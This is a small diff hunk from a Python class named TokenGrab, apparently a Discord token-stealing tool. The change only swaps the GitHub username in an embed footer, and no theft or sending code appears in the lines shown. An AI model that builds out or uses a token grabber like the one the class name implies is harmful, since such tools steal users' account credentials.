@@ -160,7 +160,7 @@ class TokenGrab:
                         "icon_url": avatar_url
                     },
                     "footer": {
-                        "text": "github.com/NightfallGT"
+                        "text": "github.com/SweetMoonSM"
                     }
                 }
             
